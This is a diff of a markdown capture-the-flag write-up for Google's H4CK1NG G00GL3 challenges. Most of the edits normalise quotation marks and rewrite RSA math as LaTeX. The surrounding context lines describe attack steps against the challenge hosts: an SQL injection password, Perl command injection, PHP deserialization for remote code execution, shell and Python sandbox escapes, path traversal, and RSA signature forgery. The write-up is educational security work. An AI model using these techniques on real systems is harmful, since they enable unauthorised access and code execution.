@@ -81,17 +81,17 @@ The attack was aimed at dozens of other organizations, including Google, between
 >
 > Hint: Don't make this game harder than it needs to be.
 
-As the description states, you need to “win” a chess game. Unfortunately, the game is anything but fair: after the first few moves, all the opponents pawns will turn into queens. Check mate.
+As the description states, you need to "win" a chess game. Unfortunately, the game is anything but fair: after the first few moves, all the opponents pawns will turn into queens. Check mate.
 
 Clicking on the link, we get to [the check board](https://hackerchess-web.h4ck.ctfcompetition.com).
 
 #### Solution
 
-This game is full of bugs. Moreover, changing the difficulty won’t have any noticeable effect :)
+This game is full of bugs. Moreover, changing the difficulty won't have any noticeable effect :)
 
-There is an SQL injection in the “master login“ page.
+There is an SQL injection in the "master login" page.
 
-Use username `master` and password `‘or’x’=‘x` to get access to the admin page. Here is an example with cURL, you will have to use the browser.
+Use username `master` and password `'or'x'='x` to get access to the admin page. Here is an example with cURL, you will have to use the browser.
 
 ```shell
 ❯ curl 'https://hackerchess-web.h4ck.ctfcompetition.com/admin.php' -X POST \
@@ -186,7 +186,7 @@ And here is my flag! Along with it, we get the DB password, and some juicy infor
 
 ### CHALLENGE 02
 
-> After recent attacks, we’ve developed a search tool. Search the logs and discover what the attackers were after.
+> After recent attacks, we've developed a search tool. Search the logs and discover what the attackers were after.
 >
 > Hint: Always search deeper.
 
@@ -251,7 +251,7 @@ Unfortunately, no flag here, but we can see something quite interesting: this is
 
 That almost immediately rang a bell: *what if this thing uses Perl `open()` ?*
 
-That would be particularly ‘handy’ as that function can actually [execute programs](https://stackoverflow.com/questions/27084779/perl-code-pipe-in-open-statement).
+That would be particularly 'handy' as that function can actually [execute programs](https://stackoverflow.com/questions/27084779/perl-code-pipe-in-open-statement).
 
 ```shell
 ❯ time curl -G 'https://aurora-web.h4ck.ctfcompetition.com/' \
@@ -370,7 +370,7 @@ Passing some rubbish as the key, we learn that the executable wants a PEM encode
 2022/10/14 21:51:09 failed to read the PEM block from the key file
 ```
 
-Let’s look at the code using [`Radare 2`](https://rada.re/n/):
+Let's look at the code using [`Radare 2`](https://rada.re/n/):
 
 ```shell
 ❯ r2 wannacry  # This will take a long time (go binary) 
@@ -397,7 +397,7 @@ INFO: Analyze all functions arguments/locals
 [...]
 ```
 
-Oh, wow. In retrospective, probably a carefully crafted  `string/grep` on `./wannacry` would suffice... Anyway, we have a lead:
+Oh, wow. In retrospective, probably a carefully crafted `strings/grep` on `./wannacry` would suffice... Anyway, we have a lead:
 
 ```text
 0x005094aa "Keys are here:.https://wannacry-keys-***REDACTED***/.<blah blah>
@@ -405,7 +405,7 @@ Oh, wow. In retrospective, probably a carefully crafted  `string/grep` on `./wan
 
 The URL above brings us to a directory full of PEM keys… which one is the right one?
 
-Since there are only 200 keys, let’s download them all:
+Since there are only 200 keys, let's download them all:
 
 ```shell
 ❯ curl -s https://wannacry-keys-***REDACTED***/|grep pem|wc -l
@@ -471,7 +471,7 @@ wannacry: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically l
 
 #### Solution
 
-Let’s fire up Radare 2 and analyse the binary:
+Let's fire up Radare 2 and analyse the binary:
 
 ```asm
 ❯ r2 ./wannacry
@@ -635,7 +635,7 @@ for ar in async_results:
         print(result.text)
 ```
 
-The server-side code probably shares client’s logic, as the “right” code changes in time. Thus, the script might fail if the flag changes while it’s running.
+The server-side code probably shares client's logic, as the "right" code changes in time. Thus, the script might fail if the flag changes while it's running.
 
 ```html
 ❯ ./ep001ch02.py
@@ -668,9 +668,9 @@ Solutions 2-4 requires running the binary, of course. In general, this is not a 
 
 ### CHALLENGE 03
 
-> Your opponents are always learning. They’ll keep coming back stronger.
+> Your opponents are always learning. They'll keep coming back stronger.
 >
-> Hint: Opponents patch their vulnerabilities, too. The same strategy won’t work twice.
+> Hint: Opponents patch their vulnerabilities, too. The same strategy won't work twice.
 
 The link brings us to the same chess game we hacked in EP000CH01.
 
@@ -705,7 +705,7 @@ If we decode the b64, we get something like:
 a:2:{i:0;s:2:"d2";i:1;s:2:"d4";}
 ```
 
-At first, I couldn’t see anything interesting here, and I was a bit lost.
+At first, I couldn't see anything interesting here, and I was a bit lost.
 
 Then I remembered that I had full access to the source code in EP000CH01. Since this version of the game is just a patched version of that one, I downloaded its source:
 
@@ -778,11 +778,11 @@ if (isset($_GET['move_start'])) {
 [...]
 ```
 
-In general, it’s a bad idea to deserialize data straight from user input. Although I didn’t have any direct experience with PHP deserialization, I played with a Python deserialization vulnerability in the past, so this immediately rang a bell.
+In general, it's a bad idea to deserialize data straight from user input. Although I didn't have any direct experience with PHP deserialization, I played with a Python deserialization vulnerability in the past, so this immediately rang a bell.
 
 What if I deserialize our `Stockfish` class instead of the expected move? In particular, the `$binary` attribute of that class looks a great candidate: I could replace the executable with anything we want to run: BOOM, RCE.
 
-Unfortunately, deserialization alone won’t work in this case, as we need something to actually use our object. After a brief Google investigation, I learned about PHP magic methods!
+Unfortunately, deserialization alone won't work in this case, as we need something to actually use our object. After a brief Google investigation, I learned about PHP magic methods!
 
 The magic methods that are relevant in our context are `__wakeup()`  and `__destruct()`. As the names suggest, `__wakeup()` is called when the object is instantiated, while `__destruct()` is invoked when the object is disposed.
 
@@ -796,9 +796,9 @@ public function __wakeup()
 }
 ```
 
-Note: it’s unlikely that IRL you will find something like this, an exploit served on a silver plate. Nevertheless, PHP deserialization can lead to [real life vulnerabilities](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) (edit: have you heard about [CVE-2022-22241](https://nvd.nist.gov/vuln/detail/CVE-2022-22241)?)
+Note: it's unlikely that IRL you will find something like this, an exploit served on a silver plate. Nevertheless, PHP deserialization can lead to [real life vulnerabilities](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) (edit: have you heard about [CVE-2022-22241](https://nvd.nist.gov/vuln/detail/CVE-2022-22241)?)
 
-OK, we have everything we need. Let’s write the exploit.
+OK, we have everything we need. Let's write the exploit.
 
 ```php
 <?php
@@ -848,7 +848,7 @@ Vigilance alone is not always enough. So, a company should have detection and re
 >
 > Hint: Sometimes the answers are hidden in plain site
 
-In this challenge, you are given an image file, with the name of the CTF: “H4CK1NG G00GL3”.
+In this challenge, you are given an image file, with the name of the CTF: "H4CK1NG G00GL3".
 
 I was pretty confident that this was all about [steganography](https://en.wikipedia.org/wiki/Steganography):
 
@@ -890,7 +890,7 @@ Certificate:
 
 ### CHALLENGE 02
 
-> After recent attacks, we’ve developed a search tool. Search the logs and discover what the attackers were after.
+> After recent attacks, we've developed a search tool. Search the logs and discover what the attackers were after.
 >
 > HINT: Use the tool to be forensic in your search.
 
@@ -938,7 +938,7 @@ Another easy success.
 >
 > Hint: How can you ask the shell for which commands are available?
 
-We clearly need to execute that command… (but don’t forget to do it in a sandbox!)
+We clearly need to execute that command… (but don't forget to do it in a sandbox!)
 
 ```shell
 ❯ socat FILE:`tty`,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337
@@ -994,7 +994,7 @@ else                 quarantine
 ~ $
 ```
 
-Unfortunately, most commands are restricted by the “sandboxed shell” environment we are in:
+Unfortunately, most commands are restricted by the "sandboxed shell" environment we are in:
 
 ```shell
 ~ $ test
@@ -1008,7 +1008,7 @@ command blocked: `test`
 check completions to see available commands
 ```
 
-Our duty, if it wasn’t clear, is to escape this quarantined shell and find the flag.
+Our duty, if it wasn't clear, is to escape this quarantined shell and find the flag.
 
 A few commands caught my attention, as you don't typically see them every day. To name some:
 
@@ -1022,11 +1022,11 @@ quarantine_protocol
 
 I had high expectations from `coproc` and `time` but it turned out to be a dead-end.
 
-We can’t run these commands but, specifically for `quarantine` and `quarantine_protocol`, I wonder what would happen if the system couldn’t find them...
+We can't run these commands but, specifically for `quarantine` and `quarantine_protocol`, I wonder what would happen if the system couldn't find them...
 
 From my Systems interviews, I remembered the priority of shell commands:
 
-> Aliases > Shell reserved words > Functions > Built-in commands > “File system” commands
+> Aliases > Shell reserved words > Functions > Built-in commands > "File system" commands
 
 So, what if we defined a function named `quarantine` or `quarantine_protocol`? The `function` keyword is not restricted, fortunately!
 
@@ -1050,9 +1050,9 @@ https://h4ck1ng.google/solve/**REDACTED**
 
 ## EP003 - Red Team
 
-“To make sure things are safe, sometimes, you need someone to break them.”
+"To make sure things are safe, sometimes, you need someone to break them."
 
-Red Team emulate attackers’ behaviour and try to hack you before they will do it.
+Red Team emulate attackers' behaviour and try to hack you before they will do it.
 
 ### CHALLENGE 01
 
@@ -1060,7 +1060,7 @@ Red Team emulate attackers’ behaviour and try to hack you before they will do 
 >
 > Hint: Find the key, and put RFC 6749 to use
 
-RFC 6749 is about “The OAuth 2.0 Authorization Framework”.
+RFC 6749 is about "The OAuth 2.0 Authorization Framework".
 
 And if we execute the socat command, we are asked for a password:
 
@@ -1076,7 +1076,7 @@ The first part of the challenge is to find the password… There is a nice hint 
 
 > Blink and you'll miss it (9:29). Blink and you'll miss it again (15:09).
 
-In fact, at 15:09 of the intro video contains the password you need. But unfortunately that doesn’t bring us far:
+In fact, at 15:09 of the intro video contains the password you need. But unfortunately that doesn't bring us far:
 
 ```shell
 ❯ socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337
@@ -1089,7 +1089,7 @@ developer@googlequanta.com:/home/developer$ id
 uid=1000(developer) gid=1000(developer) groups=1000(developer)
 ```
 
-There is no flag on this machine, but we can find an interesting `todo.txt` in `developer`’s directory:
+There is no flag on this machine, but we can find an interesting `todo.txt` in `developer`'s directory:
 
 ```text
 developer@googlequanta.com:/home/developer$ cat todo.txt
@@ -1206,11 +1206,11 @@ The first time I tackled this challenge, I had no clue about how to cheat. I tri
 
 So, I played it.
 
-In the dungeon you will find several geo coordinates, with some info like “pass-phrases” or codes. These are not useful for this challenge, but are related to a real-world treasure hunt.
+In the dungeon you will find several geo coordinates, with some info like "pass-phrases" or codes. These are not useful for this challenge, but are related to a real-world treasure hunt.
 
-Once you finish the game, you get an additional hint about an “cheat code used long time ago”…
+Once you finish the game, you get an additional hint about an "cheat code used long time ago"…
 
-My favourite cheat code is IDDQD, but unfortunately, it wasn’t this one 🙂 Instead the hint referred to another legendary cheat: the [Konami Code](https://en.wikipedia.org/wiki/Konami_Code):
+My favourite cheat code is IDDQD, but unfortunately, it wasn't this one 🙂 Instead the hint referred to another legendary cheat: the [Konami Code](https://en.wikipedia.org/wiki/Konami_Code):
 
 > UP, UP, DOWN, DOWN, LEFT, RIGHT, LEFT, RIGHT, B, A
 
@@ -1235,17 +1235,17 @@ Soon enough, I realized that this thing accepted *some* Python command:
 \
 ```
 
-Notably, `import` doesn't work. So, we cannot, for instance, execute system commands (e.g., `import os` + `os.system(“sh”)`).
+Notably, `import` doesn't work. So, we cannot, for instance, execute system commands (e.g., `import os` + `os.system("sh")`).
 
 Being a sort of sandbox, we need to escape it and find the flag. Knowing that sandboxing Python is basically impossible, I had high hope for this lead.
 
 Searching the Internet, I found this great write-up: [The Craziest Python Sandbox Escape](https://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html).
 
-This article contains everything we need, but we can’t use the proposed exploit as it is because:
+This article contains everything we need, but we can't use the proposed exploit as it is because:
 
 - we have a limit on the length of each line of code we can input in this "shell";
-- we don’t need to use creativity to “compose” any strings;
-- our sandbox doesn’t appear to have any persistence, besides the `config` object used by the game.
+- we don't need to use creativity to "compose" any strings;
+- our sandbox doesn't appear to have any persistence, besides the `config` object used by the game.
 
 After few iterations, also after 1 hour spent on printing available methods and attributes in `config`, I came up with this exploit. The first part just activates the shell entering the cheat code, while the second part escapes the sandbox:
 
@@ -1270,7 +1270,7 @@ Basically, I leveraged `config.logger` to maintain some persistence and I starte
 
 `str.__base__.__subclasses__()[84]()` will give us an instance of the 84th subclass of `object` class: a `_frozen_importlib.BuiltinImporter` object. We can use that to load the `builtins` module and then invoke `__import__()` to get the `os` module.
 
-The last step is to call `os.system(“sh”)` to get a shell.
+The last step is to call `os.system("sh")` to get a shell.
 
 ### CHALLENGE 03
 
@@ -1290,7 +1290,7 @@ The base64 in the path leads to:
 
 [https://corgis-web.h4ck.ctfcompetition.com/corgi?DOCID=flag&_mac=ded09ff1528f29800b1e733e6208ea362666b9eeb5f40c264fc5fb19daa36939](https://corgis-web.h4ck.ctfcompetition.com/corgi?DOCID=flag&_mac=ded09ff1528f29800b1e733e6208ea362666b9eeb5f40c264fc5fb19daa36939)
 
-Now, I am pretty sure we are supposed to side-load the apk… I don’t have an Android phone (only the work one), but even if I had one, I would never side-load a random apk 💩 So, I decompiled the apk using [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Specifically, I installed it via the provided Dockerfile.
+Now, I am pretty sure we are supposed to side-load the apk… I don't have an Android phone (only the work one), but even if I had one, I would never side-load a random apk 💩 So, I decompiled the apk using [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Specifically, I installed it via the provided Dockerfile.
 
 Note: I later discovered that there is an [online demo here](https://mobsf.live), but I recommend using a local version because I noticed some inconsistencies on the demo version.
 
@@ -1302,7 +1302,7 @@ POSSIBLE HARDCODED SECRETS
 "hmac_shared_secret" : "uBvB5rPgH0U+yPhzPq9y2i4f1396t/2dCpo3gd7l1+0="
 ```
 
-Awesome. I then went to VSCode and started browsing the application’s code.
+Awesome. I then went to VSCode and started browsing the application's code.
 
 After some source research, I found that the app can scan qr-codes (unsurprisingly) and issue API calls.
 
@@ -1311,7 +1311,7 @@ The important bits are in `google/ h4ck1ng / secretcorgis`. Specifically, `Netwo
 The application crafts an HTTP GET request to `https://corgis-web.h4ck.ctfcompetition.com/corgi`, using the following headers:
 
 - X-Document-ID
-  - The most straightforward choice here seems to be `flag`, as it’s in the above b64-encoded URL
+  - The most straightforward choice here seems to be `flag`, as it's in the above b64-encoded URL
 - X-Request-Nonce
   - The application just throws 32 bytes of random data in here, presumably to prevent replay attacks
 - X-User-Subscribed
@@ -1450,7 +1450,7 @@ The link brings us to a website: [https://vrp-website-web.h4ck.ctfcompetition.co
 
 #### Solution
 
-The first thing I did is explore the site. As suggested, some pages are different from the “real” [Google’s bug bounty website](https://bughunters.google.com).
+The first thing I did is explore the site. As suggested, some pages are different from the "real" [Google's bug bounty website](https://bughunters.google.com).
 
 One in particular, the FAQ page, has links to the endpoints mentioned in the challenge description:
 
@@ -1491,7 +1491,7 @@ It took me several tries to guess the parameter to enable the dry run. Assuming 
 could not open file <nil>: request Content-Type isn't multipart/form-data
 ```
 
-Ah! So now the endpoint expects form-data… After some tests, remembering the batch-import “tip” in the challenge description, I found the right name for the file upload:
+Ah! So now the endpoint expects form-data… After some tests, remembering the batch-import "tip" in the challenge description, I found the right name for the file upload:
 
 ```shell
 ❯ curl -s  http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true \
@@ -1530,7 +1530,7 @@ tar: Removing leading `../../../' from member names
 WARNING: file ../../etc/issue already exists and would get overwritten (enable debug to see differences)
 ```
 
-Let’s try that debug thing:
+Let's try that debug thing:
 
 ```shell
 curl -s http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true\&debug=true \
@@ -1548,7 +1548,7 @@ showing existing and new contents:
 =====
 ```
 
-Yes!  The app shows us the diff between the remote file and the one in our tarball. While testing some more, I noticed that the submission `parameter` accepts absolute paths, so I didn’t need to use the tar trick shown above.
+Yes!  The app shows us the diff between the remote file and the one in our tarball. While testing some more, I noticed that the submission `parameter` accepts absolute paths, so I didn't need to use the tar trick shown above.
 
 Here is the final exploit I wrote using Python, I was extremely lucky to find the flag straight away in `/flag` :)
 
@@ -1599,7 +1599,7 @@ We are given a NodeJS app. As it turns out, this is the same app used in challen
 
 #### Solution
 
-The theme for this challenge is bug hunting. So, let’s find some bugs.
+The theme for this challenge is bug hunting. So, let's find some bugs.
 
 In `services/users.js` I found the hashed passwords for `don`, who seems to be an admin, and `tin`.
 
@@ -1610,7 +1610,7 @@ const users = [
 ]
 ```
 
-Given the hint, at first, I thought this was about brute forcing `tin`’s account and then, somehow, “escalate” to `don`… But I wasn't certain that the hardcoded passwords were the same used in the online instance of the app, and the application has a “password reset” service, so I kept searching for bugs.
+Given the hint, at first, I thought this was about brute forcing `tin`'s account and then, somehow, "escalate" to `don`… But I wasn't certain that the hardcoded passwords were the same used in the online instance of the app, and the application has a "password reset" service, so I kept searching for bugs.
 
 `safeEqual()` functions caught my attention. Finding custom functions doing work that it's readily available in core (or popular) libraries is always a red flag. And, in fact, here it is our bug in its majestic splendour!
 
@@ -1652,7 +1652,7 @@ How can we exploit this?
 Base64 alphabet does include ASCII digits so, to get a `true` from `safeEqual` we need to provide a password that, when hashed and encoded either:
 
 1. has all the digits in the same position as the hardcoded password;
-2. doesn’t have any digit, AND also the stored `b64(sha1(password))` doesn’t have any digit.
+2. doesn't have any digit, AND also the stored `b64(sha1(password))` doesn't have any digit.
 
 Number 1 looked quite hard, while 2. definitely more viable. This also thanks to the password reset feature for the user `tin`.
 
@@ -1742,7 +1742,7 @@ There is no link for this challenge.
 
 It took me quite a while to realize what I should do for this challenge. Looking back at the source code for the bug bounty website, I noticed a NodeJS route for `/contributing` page.
 
-Unfortunately, we cannot access that page on the online instance, as we can’t log in as an admin (i.e., `don`), but we can browse our local instance!
+Unfortunately, we cannot access that page on the online instance, as we can't log in as an admin (i.e., `don`), but we can browse our local instance!
 
 In the `contributing` view, we found the following message:
 
@@ -1794,11 +1794,11 @@ error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompet
 
 A pre-receive git hook is blocking our valuable contribution. Obviously, we need to bypass it. But, what is a git hook?
 
-> Hooks are programs you can place in a hooks directory to trigger actions at certain points in git’s execution.
+> Hooks are programs you can place in a hooks directory to trigger actions at certain points in git's execution.
 
 Hooks are typically used to protect your Git repository from mistakes, automate manual processes, gather data about git activity, and much more. Some hooks are executed on the client, but others are run on the remote endpoint (like in our case).
 
-Reading carefully what the remote end is telling us, there is also a presubmit “hook” that has been skipped? Now, while the pre-receive hook is quite popular, I have never heard about a pre-submit one… so `presubmit` must be part of the pre-receive hook handler.
+Reading carefully what the remote end is telling us, there is also a presubmit "hook" that has been skipped? Now, while the pre-receive hook is quite popular, I have never heard about a pre-submit one… so `presubmit` must be part of the pre-receive hook handler.
 
 Apparently, we can enable this presubmit thing via push option:
 
@@ -1834,7 +1834,7 @@ Nice 🙂 the server is telling us that it executed `build.sh`, failing on line 
 6.
 ```
 
-Too good to be true? Unfortunately, yes: I tried to put some commands in `build.sh` but I soon realized that it's the “previous” version of the script to be executed, not the one being pushed :(
+Too good to be true? Unfortunately, yes: I tried to put some commands in `build.sh` but I soon realized that it's the "previous" version of the script to be executed, not the one being pushed :(
 
 BUT, the script interacts with pushed code, and, in particular, it sources `configure_flags.sh`!
 
@@ -1894,25 +1894,25 @@ You are given a mysterious `challenge.bin` file.
 
 #### Solution
 
-The bin file doesn’t have any obvious signature, and it is a sparse file.
+The bin file doesn't have any obvious signature, and it is a sparse file.
 
-The hint seems to suggest that this file is something related to toys from the 90s… if you watched the intro video, it looks pretty obvious that it’s related to [Tamagotchi](https://en.wikipedia.org/wiki/Tamagotchi).
+The hint seems to suggest that this file is something related to toys from the 90s… if you watched the intro video, it looks pretty obvious that it's related to [Tamagotchi](https://en.wikipedia.org/wiki/Tamagotchi).
 
 Searching the internet, I found a Tamagotchi P1 emulator which looked promising: [TamaTool](https://github.com/jcrona/tamatool). At first, I thought that the image was a ROM, but I abandoned that lead as:
 
-- it didn’t work out-of-the-box with the emulator;
-- wrt the “original” ROM (available, for instance, [here](https://www.planetemu.net/rom/mame-roms/tama)), our file is too small and sparse;
-- Tamagotchi’s ROMs are protected by copyright, so Google couldn’t realistically hack and redistribute one (also writing one from scratch looked pretty overkill by me).
+- it didn't work out-of-the-box with the emulator;
+- wrt the "original" ROM (available, for instance, [here](https://www.planetemu.net/rom/mame-roms/tama)), our file is too small and sparse;
+- Tamagotchi's ROMs are protected by copyright, so Google couldn't realistically hack and redistribute one (also writing one from scratch looked pretty overkill by me).
 
 While playing with the TamaTool, I noticed that it can extract images from the ROM. That, together with the challenge hint, was a strong indication I was dealing with an image file.
 
-It took me more than 1 day to understand how to decode this image (image formats are not my cup of tea)… I started playing with ImageMagick (the convert tool, specifically) but I couldn’t find much...
+It took me more than 1 day to understand how to decode this image (image formats are not my cup of tea)… I started playing with ImageMagick (the convert tool, specifically) but I couldn't find much...
 
 Then my frustration made me use the brute force. I built a Python script, using Pillow, to iterate over some image sizes (width and height). I was pretty sure I was dealing with a B/W image (since Tamagotchi has a monochromatic display), which means one bit per pixel.
 
 Brute-force kind-of worked, not giving me a perfect picture, but something with clear, recognizable, patterns. I could read part of the flag, and that gave me a huge hint on the file format: as it turns out, the image uses 2 bits per pixel!
 
-I still couldn’t get a perfect picture, but this is the exploit I used to read the whole flag.
+I still couldn't get a perfect picture, but this is the exploit I used to read the whole flag.
 
 ```python
 #!/usr/bin/env python3
@@ -1952,7 +1952,7 @@ The challenge also has a link to the source code of the game, which is written i
 
 #### Solution
 
-You can’t “win” this game just playing, of course. The point of the challenge is to submit (somehow) a negative score and get the flag. The source code agrees with that statement :)
+You can't "win" this game just playing, of course. The point of the challenge is to submit (somehow) a negative score and get the flag. The source code agrees with that statement :)
 
 ```python
 if score < 0:
@@ -1979,36 +1979,40 @@ if type(score) != int or score < 0:
         return json_response(400, text="invalid score")
 ```
 
-Looking at the source, the signature is a “homemade” RSA signature. And for “homemade” I mean this:
+Looking at the source, the signature is a "homemade" RSA signature. And for "homemade" I mean this:
 
 ```python
 s = pow(encryption_block, self.d, self.n)
 ```
 
-If there is one thing I learned in security, it’s that you should never ever write your own crypto stuff. Cryptography is hard, and even experts can make mistakes. So, that definitely raised a flag.
+If there is one thing I learned in security, it's that you should never ever write your own crypto stuff. Cryptography is hard, and even experts can make mistakes. So, that definitely raised a flag.
 
 I also found that the public key is available at the `/api/keys` endpoint, so I carefully inspected the algorithms used for signing and verifying the message. Unfortunately, nothing obvious came up on RSA usage.
 
-But, while doing the maths, I noticed that the exponent used for the public key was 3 (i.e., e=3). Some time ago, for my job, I had to [deal with RSA “internals”](https://dguerriblog.wordpress.com/2016/03/03/tpm2-0-and-openssl-on-linux-2/) a bit, so I remembered that e=3 wasn't considered safe.
+But, while doing the maths, I noticed that the exponent used for the public key was 3 (i.e., $e=3$). Some time ago, for my job, I had to [deal with RSA "internals"](https://dguerriblog.wordpress.com/2016/03/03/tpm2-0-and-openssl-on-linux-2/) a bit, so I remembered that $e=3$ wasn't considered safe.
 
 More investigation made me realize that using a low exponent is not in general a mistake, but it can lead to issues under certain circumstances. I fired up some automated tool to identify known weakness on the key, but no joy.
 
-Then, I started to focus on signature forgery (as opposed to private key “derivation” I was attempting before) and I came across this [great post from Filippo Valsorda](https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/) about [CVE-2016-1494](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1494).
+Then, I started to focus on signature forgery (as opposed to private key "derivation" I was attempting before) and I came across this [great post from Filippo Valsorda](https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/) about [CVE-2016-1494](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1494).
 
-The article talks about a variant of “Bleichenbacher'06 attack against RSA signature verification with low public exponent”. It is not directly applicable to our case, but the maths in it is great to solve our challenge.
+The article talks about a variant of "Bleichenbacher'06 attack against RSA signature verification with low public exponent". It is not directly applicable to our case, but the maths in it is great to solve our challenge.
 
 The high-level concepts of this exploit are related to the maths behind RSA (refer to the article linked above for a great, clear, explanation):
 
-- An RSA signature for a message `m` is calculated as `c = m^d mod N`;
-- An RSA signature on `m` is verified with `c^e mod N = m`;
-- We can trick the receiver into accepting the message `c`, if:
+- An RSA signature for a message $m$ is calculated as $c = m^d \bmod{N}$;
+- An RSA signature on $m$ is verified with $c^e \bmod{N} = m$;
+- We can trick the receiver into accepting the message $c$, if:
   - we have some degree of control on the signed message;
-  - `e`  is small, so it likely won’t cause the `mod N`  part to be involved during verification;
+  - $e$ is small, so it likely won't cause the $\bmod{N}$ part to be involved during verification;
   - the receiver is not performing an accurate verification on all parts of the message (e.g., the padding).
 
-How? By submitting a signature calculated as `m’^(-e) mod N` (this is `= m’^(-e)^e mod N = m’` under our assumptions 🙂). We don't need to know `p`, `q` or `d`.
+How? By submitting a signature calculated as $m{'}^{\frac{1}{e}} \bmod{N}$. Under our assumptions, this signature will be verified as:
 
-So, we need to craft `m’` in a way that it will make sense for the receiver, raise it to the `-e` power and then calculate it's `mod N`. The problem is that we are only approximating the real signature (the original d is not -e) so we need something to conceal the approximation error.
+${(m{'}^{\frac{1}{e}})}^e \bmod{N} = m{'}^{\frac{1}{e} * e} \bmod{N} = m{'}$
+
+We don't need to know $p$, $q$ or $d$.
+
+So, we need to craft $m'$ in a way that it will make sense for the receiver, raise it to the $\frac{1}{e}$ power and then calculate it's $\bmod{N}$. The problem is that we are only approximating the real signature (the original $d$ is not $\frac{1}{e}$) so we need something to conceal the approximation error.
 
 Do we have that something in our case?
 
@@ -2027,7 +2031,7 @@ digest_algorithm_identifier = DerSequence([
         ]))
 ```
 
-ASN.1 is hard because it’s a complicated (description) language: you can define nested structures, like sequences of sequences. Our target application does a decent job in validating the received message (after decryption with public key), but it misses checking extra stuff in the `digest_algorithm_identifier` sequence:
+ASN.1 is hard because it's a complicated (description) language: you can define nested structures, like sequences of sequences. Our target application does a decent job in validating the received message (after decryption with public key), but it misses checking extra stuff in the `digest_algorithm_identifier` sequence:
 
 ```python
 sequence = DerSequence()
@@ -2045,9 +2049,9 @@ sequence = DerSequence()
             raise Exception('invalid digest algorithm identifier')
 ```
 
-We can “smuggle” extra rubbish in that sequence, after the digest algorithm ID and the actual digest.
+We can "smuggle" extra rubbish in that sequence, after the digest algorithm ID and the actual digest.
 
-The article, linked above, explain how we can separate the to-be-signed message into a prefix, some rubbish, and a suffix. We can treat prefix and suffix separately and push the approximation error of the prefix exponentiation into the rubbish.
+The article linked above explains how we can separate the to-be-signed message into a prefix, some rubbish, and a suffix. We can treat prefix and suffix separately and push the approximation error of the prefix exponentiation into the rubbish.
 
 This is the exploit I came up with after some iteration:
 
@@ -2277,13 +2281,13 @@ This is all we get for the last challenge!
 
 #### Solution
 
-I must admit that without some help on Discord, I probably wouldn’t be able to solve this one (thanks `anton_` for helping me without spoiling it!). I watched all the videos several times, finding no hidden “message”…
+I must admit that without some help on Discord, I probably wouldn't be able to solve this one (thanks `anton_` for helping me without spoiling it!). I watched all the videos several times, finding no hidden "message"…
 
-As it turned out, I should have listened more than watched… and with a good headset. My age also didn’t help as my hearing is pretty bad :(
+As it turned out, I should have listened more than watched… and with a good headset. My age also didn't help as my hearing is pretty bad :(
 
-So, the message is Morse code, “hidden” right before the first person’s introduction of each episode.
+So, the message is Morse code, "hidden" right before the first person's introduction of each episode.
 
-When I finally heard it, I downloaded each episode’s audio tract, and with FFmpeg, I isolated ~6 seconds of each chunk, also filtering out everything but the frequency range used to transmit the code.
+When I finally heard it, I downloaded each episode's audio tract, and with FFmpeg, I isolated ~6 seconds of each chunk, also filtering out everything but the frequency range used to transmit the code.
 
 I could find the approximate frequency, after few iterations, thanks to this website: [https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
 
@@ -2319,13 +2323,13 @@ I could find the approximate frequency, after few iterations, thanks to this web
     -filter:a "highpass=f=4000, lowpass=f=6000" ep005b.mp3
 ```
 
-I then uploaded each chunk to [https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html), and retrieve the message. Note that it’s necessary to lower the volume threshold a bit.
+I then uploaded each chunk to [https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html), and retrieve the message. Note that it's necessary to lower the volume threshold a bit.
 
 Done, right?
 
 Nope… as it turned out, there is some sort of bug: the second and third episode has the same code. You can find a thread on Discord about it.
 
-I had to use a bit of imagination to guess the right chunk: it’s basically the slogan of h4ck1ng G00gl3…
+I had to use a bit of imagination to guess the right chunk: it's basically the slogan of h4ck1ng G00gl3…
 
 GG
 
